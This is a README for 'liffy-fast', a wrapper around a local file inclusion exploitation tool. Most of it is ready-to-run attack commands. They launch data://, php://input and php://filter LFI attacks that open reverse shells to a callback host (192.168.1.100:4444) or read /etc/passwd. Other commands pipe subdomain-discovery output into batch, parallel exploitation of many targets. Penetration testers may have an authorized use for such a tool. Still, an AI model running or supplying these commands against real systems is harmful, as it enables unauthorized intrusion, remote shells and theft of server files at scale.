# Liffy Techniques - Fast LFI Testing

Enhanced Liffy with technique-specific commands for fast testing using xargs, parallel, and batch processing.

## Features

- **Technique-specific commands**: Dedicated commands for each LFI technique
- **Batch processing**: Process multiple URLs from stdin
- **Parallel execution**: Multi-threaded processing for faster testing
- **xargs support**: Easy integration with xargs for command-line processing
- **GNU parallel support**: Advanced parallel processing capabilities
- **JSON output**: Structured output for further processing
- **Auto-detection**: Automatic IP and port detection
- **Flexible configuration**: Customizable timeouts, threads, and other parameters

## Installation

1. Make sure you have the required dependencies:
```bash
pip install -r requirements.txt
```

2. Make the wrapper script executable:
```bash
chmod +x liffy-fast
```

3. (Optional) Install GNU parallel for advanced parallel processing:
```bash
# Ubuntu/Debian
sudo apt install parallel

# CentOS/RHEL
sudo yum install parallel

# macOS
brew install parallel
```

## Usage

### Basic Syntax

```bash
liffy-fast [technique] [options]
```

### Available Techniques

- `data` - data:// technique
- `input` - php://input technique  
- `filter` - php://filter technique
- `auto` - automatic technique detection

### Common Options

- `--url URL` - Target URL with LFI parameter
- `--lhost IP` - Callback host for reverse shells
- `--lport PORT` - Callback port for reverse shells
- `--auto-ip` - Auto-detect IP address
- `--auto-port` - Auto-detect available port
- `--batch` - Process URLs from stdin
- `--parallel` - Process URLs in parallel
- `--json` - Output results in JSON format
- `--threads N` - Number of parallel threads
- `--timeout N` - Request timeout in seconds
- `--cookies COOKIES` - Session cookies
- `--user-agent UA` - Custom User-Agent string
- `--proxy PROXY` - HTTP proxy
- `--verbose` - Verbose output
- `--output FILE` - Output file for logs

## Examples

### Single URL Testing

```bash
# Basic data technique
liffy-fast data --url "http://target/file.php?page=" --lhost 192.168.1.100 --lport 4444

# Filter technique for file reading
liffy-fast filter --url "http://target/file.php?page=" --file "/etc/passwd"

# Auto technique detection
liffy-fast auto --url "http://target/file.php?page=" --auto-ip --auto-port
```

### Batch Processing

```bash
# Process multiple URLs from file
cat urls.txt | liffy-fast data --batch --lhost 192.168.1.100 --lport 4444

# Parallel batch processing
cat urls.txt | liffy-fast data --batch --parallel --lhost 192.168.1.100 --lport 4444

# JSON output for further processing
cat urls.txt | liffy-fast data --batch --json --lhost 192.168.1.100 --lport 4444 > results.json
```

### Xargs Integration

```bash
# Basic xargs usage
cat urls.txt | xargs -I {} liffy-fast data --url "{}" --lhost 192.168.1.100 --lport 4444

# Xargs with parallel processing
cat urls.txt | xargs -P 4 -I {} liffy-fast data --url "{}" --lhost 192.168.1.100 --lport 4444

# Xargs with auto IP detection
cat urls.txt | xargs -I {} liffy-fast data --url "{}" --auto-ip --auto-port
```

### GNU Parallel Integration

```bash
# Basic parallel usage
cat urls.txt | parallel -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'

# Parallel with progress bar
cat urls.txt | parallel --progress -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'

# Parallel with job log
cat urls.txt | parallel --joblog liffy_jobs.log -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'

# Parallel with different techniques
cat urls.txt | parallel -j 4 'liffy-fast {1} --url {2} --lhost 192.168.1.100 --lport 4444' ::: data input filter auto :::+ urls.txt
```

### Advanced Examples

```bash
# Multiple techniques with different parameters
for technique in data input filter auto; do
  cat urls.txt | liffy-fast $technique --batch --lhost 192.168.1.100 --lport 4444 --output "liffy_${technique}_results.log"
done

# Parallel processing with different ports
cat urls.txt | parallel -j 4 'liffy-fast data --url {} --lhost 192.168.1.100 --lport {#}'

# Batch processing with custom parameters
cat urls.txt | liffy-fast data --batch --lhost 192.168.1.100 --lport 4444 --cookies "session=abc123" --timeout 60 --proxy "http://127.0.0.1:8080"
```

## Output Formats

### Standard Output
```
[INFO] Processing 1/10: http://target1/file.php?page=
[SUCCESS] SUCCESS: http://target1/file.php?page=
[INFO] Processing 2/10: http://target2/file.php?page=
[ERROR] FAILED: http://target2/file.php?page= - Connection timeout
```

### JSON Output
```json
[
  {
    "url": "http://target1/file.php?page=",
    "technique": "data",
    "success": true,
    "error": null,
    "timestamp": "2024-01-01T12:00:00"
  },
  {
    "url": "http://target2/file.php?page=",
    "technique": "data",
    "success": false,
    "error": "Connection timeout",
    "timestamp": "2024-01-01T12:00:01"
  }
]
```

## Performance Tips

1. **Use parallel processing** for large URL lists:
   ```bash
   cat urls.txt | liffy-fast data --batch --parallel --threads 8
   ```

2. **Use GNU parallel** for advanced parallel processing:
   ```bash
   cat urls.txt | parallel -j 8 'liffy-fast data --url {} --lhost 192.168.1.100 --lport 4444'
   ```

3. **Adjust timeout** based on target response time:
   ```bash
   liffy-fast data --url "http://target/file.php?page=" --timeout 60
   ```

4. **Use auto-detection** to avoid manual configuration:
   ```bash
   liffy-fast data --url "http://target/file.php?page=" --auto-ip --auto-port
   ```

## Troubleshooting

### Common Issues

1. **Permission denied**: Make sure the script is executable:
   ```bash
   chmod +x liffy-fast
   ```

2. **Python not found**: Ensure Python 3 is installed and in PATH:
   ```bash
   which python3
   ```

3. **Missing dependencies**: Install required packages:
   ```bash
   pip install -r requirements.txt
   ```

4. **Port already in use**: Use auto-port detection:
   ```bash
   liffy-fast data --url "http://target/file.php?page=" --auto-port
   ```

### Debug Mode

Use verbose output for debugging:
```bash
liffy-fast data --url "http://target/file.php?page=" --verbose
```

## Integration with Other Tools

### With Subfinder and httpx
```bash
subfinder -d example.com | httpx -silent | liffy-fast data --batch --auto-ip --auto-port
```

### With gau and gf
```bash
echo "http://target.com" | gau | gf xss | liffy-fast data --batch --auto-ip --auto-port
```

### With nuclei
```bash
nuclei -l urls.txt -t lfi.yaml | liffy-fast data --batch --auto-ip --auto-port
```

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## License

This project is licensed under the MIT License - see the LICENSE file for details.